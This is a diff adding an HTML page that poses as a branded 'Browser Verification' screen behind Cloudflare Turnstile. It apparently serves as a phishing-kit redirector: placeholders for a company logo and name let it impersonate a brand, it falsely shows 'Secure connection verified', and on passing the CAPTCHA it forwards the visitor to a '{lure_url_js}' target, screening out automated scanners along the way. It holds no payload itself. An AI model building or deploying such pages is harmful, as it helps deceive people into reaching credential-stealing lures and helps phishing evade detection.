@@ -1,0 +1,230 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+    <title>Verifying Your Browser...</title>
+    <link rel="shortcut icon" href="[base64 image data here]" type="image/png">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js?render=explicit"></script>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+        
+        html, body {
+            width: 100%;
+            height: 100vh;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            background: linear-gradient(135deg, #030303 10%, #FF6600 90%);
+            overflow: hidden;
+        }
+        
+        /* Animated background circles */
+        .bg-decoration {
+            position: absolute;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.1);
+            animation: float 20s infinite ease-in-out;
+        }
+        
+        .circle-1 {
+            width: 300px;
+            height: 300px;
+            top: -100px;
+            left: -100px;
+            animation-delay: 0s;
+        }
+        
+        .circle-2 {
+            width: 200px;
+            height: 200px;
+            bottom: -50px;
+            right: -50px;
+            animation-delay: 5s;
+        }
+        
+        .circle-3 {
+            width: 150px;
+            height: 150px;
+            top: 50%;
+            right: 10%;
+            animation-delay: 10s;
+        }
+        
+        @keyframes float {
+            0%, 100% {
+                transform: translateY(0) scale(1);
+            }
+            50% {
+                transform: translateY(-30px) scale(1.05);
+            }
+        }
+        
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            position: relative;
+        }
+        
+        #content {
+            background: white;
+            padding: 60px 50px;
+            border-radius: 16px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            text-align: center;
+            max-width: 480px;
+            width: 90%;
+            position: relative;
+            z-index: 10;
+            animation: slideIn 0.5s ease-out;
+        }
+        
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        
+        #content img {
+            max-width: 180px;
+            height: auto;
+            margin-bottom: 30px;
+        }
+        
+        h1 {
+            font-size: 24px;
+            color: #1a1a1a;
+            font-weight: 600;
+            margin-bottom: 12px;
+        }
+        
+        .subtitle {
+            font-size: 15px;
+            color: #6b7280;
+            margin-bottom: 35px;
+            line-height: 1.5;
+        }
+        
+        #cf-turnstile {
+            display: flex;
+            justify-content: center;
+            margin: 30px 0;
+        }
+        
+        /* Loading animation */
+        .loader-container {
+            margin: 20px 0;
+        }
+        
+        .loader {
+            width: 40px;
+            height: 40px;
+            margin: 0 auto;
+            border: 4px solid #f3f4f6;
+            border-top: 4px solid #667eea;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .security-badge {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin-top: 30px;
+            padding-top: 25px;
+            border-top: 1px solid #e5e7eb;
+            color: #9ca3af;
+            font-size: 13px;
+        }
+        
+        .security-badge svg {
+            width: 16px;
+            height: 16px;
+        }
+        
+        .powered-by {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #9ca3af;
+        }
+        
+        .powered-by a {
+            color: #667eea;
+            text-decoration: none;
+        }
+        
+        .powered-by a:hover {
+            text-decoration: underline;
+        }
+        
+        /* Responsive */
+        @media (max-width: 600px) {
+            #content {
+                padding: 40px 30px;
+            }
+            
+            h1 {
+                font-size: 20px;
+            }
+            
+            .subtitle {
+                font-size: 14px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="bg-decoration circle-1"></div>
+    <div class="bg-decoration circle-2"></div>
+    <div class="bg-decoration circle-3"></div>
+    
+    <div id="content">
+        <img src="[base64 logo data here]" alt="[company name here] Logo">
+        
+        <h1>Browser Verification</h1>
+        <p class="subtitle">We're verifying your browser to ensure a secure connection. This will only take a moment.</p>
+        
+        <div class="loader-container">
+            <div class="loader"></div>
+        </div>
+        
+        <div id="cf-turnstile"></div>
+        
+        <div class="security-badge">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor">
+                <path fill-rule="evenodd" d="M12.516 2.17a.75.75 0 00-1.032 0 11.209 11.209 0 01-7.877 3.08.75.75 0 00-.722.515A12.74 12.74 0 002.25 9.75c0 5.942 4.064 10.933 9.563 12.348a.749.749 0 00.374 0c5.499-1.415 9.563-6.406 9.563-12.348 0-1.39-.223-2.73-.635-3.985a.75.75 0 00-.722-.516l-.143.001c-2.996 0-5.717-1.17-7.734-3.08zm3.094 8.016a.75.75 0 10-1.22-.872l-3.236 4.53L9.53 12.22a.75.75 0 00-1.06 1.06l2.25 2.25a.75.75 0 001.14-.094l3.75-5.25z" clip-rule="evenodd" />
+            </svg>
+            <span>Secure connection verified</span>
+        </div>
+        
+        <div class="powered-by">
+            Protected by <a href="https://www.cloudflare.com/products/turnstile/" target="_blank">Cloudflare Turnstile</a>
+        </div>
+    </div>
+    
+    <script>
+        turnstile.ready(function () {
+            turnstile.render('#cf-turnstile', {
+                sitekey: '<CF turnstile key here>',
+                callback: function(token) {
+                    window.location.assign({lure_url_js});
+                },
+            });
+        });
+    </script>
+</body>
+</html>
